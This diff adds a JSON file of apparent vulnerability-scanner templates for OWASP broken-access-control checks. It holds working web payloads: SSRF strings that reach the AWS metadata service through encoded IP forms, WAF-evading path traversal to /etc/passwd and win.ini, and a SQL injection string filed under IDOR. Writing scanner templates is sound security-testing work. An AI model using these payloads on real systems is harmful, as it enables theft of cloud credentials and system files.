@@ -1,0 +1,153 @@
+[
+  {
+    "id": "owasp-a01-ssrf-aws-metadata",
+    "info": {
+      "name": "OWASP A01 - SSRF to AWS Metadata",
+      "severity": "critical",
+      "category": "ssrf",
+      "description": "Attempts to access AWS EC2 metadata service through SSRF (OWASP A01:2025 - Broken Access Control)",
+      "references": [
+        "https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/",
+        "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html"
+      ],
+      "tags": [
+        "owasp-a01",
+        "ssrf",
+        "cloud",
+        "aws",
+        "broken-access-control"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "http://169.254.169.254/latest/meta-data/",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "http://[::ffff:169.254.169.254]/latest/meta-data/",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "http://2852039166/latest/meta-data/",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "http://0251.0376.0251.0376/latest/meta-data/",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "ami-id",
+          "instance-id",
+          "security-credentials",
+          "iam/info"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "owasp-a01-path-traversal-waf-bypass",
+    "info": {
+      "name": "OWASP A01 - Path Traversal with WAF Bypass",
+      "severity": "high",
+      "category": "path-traversal",
+      "description": "Advanced path traversal with encoding tricks to bypass WAF (OWASP A01:2025)",
+      "references": [
+        "https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/"
+      ],
+      "tags": [
+        "owasp-a01",
+        "path-traversal",
+        "lfi",
+        "broken-access-control"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "....//....//....//etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "..%252f..%252f..%252fetc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "..%c0%af..%c0%af..%c0%afetc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/var/www/../../etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "....\\\\....\\\\....\\\\windows\\win.ini",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "root:x:",
+          "[extensions]",
+          "bin/bash"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "owasp-a01-idor-bypass",
+    "info": {
+      "name": "OWASP A01 - Insecure Direct Object Reference",
+      "severity": "high",
+      "category": "unauthorized-access",
+      "description": "Tests for IDOR vulnerabilities (OWASP A01:2025 - Broken Access Control)",
+      "references": [
+        "https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/"
+      ],
+      "tags": [
+        "owasp-a01",
+        "idor",
+        "broken-access-control"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "../admin",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/admin/../../../etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "user_id=1' OR '1'='1",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "equals",
+        "patterns": ["200"]
+      }
+    ]
+  }
+]
